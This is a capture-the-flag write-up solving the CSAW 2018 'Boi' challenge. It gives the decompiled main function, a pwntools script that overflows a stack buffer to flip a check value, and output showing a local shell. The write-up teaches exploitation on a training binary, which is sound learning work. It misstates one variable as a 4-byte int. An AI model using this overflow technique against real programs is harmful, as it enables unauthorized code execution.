# Boi - Nightmare


check file type
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2018_Quals_Boi$ file boi 
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```

lets run it:
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2018_Quals_Boi$ ./boi 
Are you a big boiiiii??
safs
Sun 21 Mar 2021 19:11:14 IST
```
we can see that no matter what we enter we get datetime

lets reverse it with Ghidra
```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined4 local_28;
  int iStack36;
  undefined4 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  iStack36 = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&local_38,0x18);
  if (iStack36 == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```
we can see that if `iStack36 == -0x350c4512` so we can run shell `/bin/bash`.
easy to see that we have overflow in `read(0,&local_38,0x18);` because local_38 is type of int- 4 bytes and the buffer is 018=24 bytes

lets write script to overflow it and change the iStack36 value
```python 
#!/usr/bin/env python
from pwn import process, packing

def exploit():
    buffer = b'A' * 20 + packing.p32(0xcaf3baee)
    prs = process("/home/matan/Documents/hacking/nightmare/stackoverflow/Csaw_2018_Quals_Boi/boi")
    prs.send(buffer)
    prs.interactive()


if __name__ == '__main__':
    exploit()
```

Result
```console
/home/matan/Documents/hde65/web_requests/nightmare/boi.py
[x] Starting local process '/home/matan/Documents/hacking/nightmare/stackoverflow/Csaw_2018_Quals_Boi/boi'
[+] Starting local process '/home/matan/Documents/hacking/nightmare/stackoverflow/Csaw_2018_Quals_Boi/boi': pid 44685
[*] Switching to interactive mode
Are you a big boiiiii??
ls
beleaf.py  boi.py
```





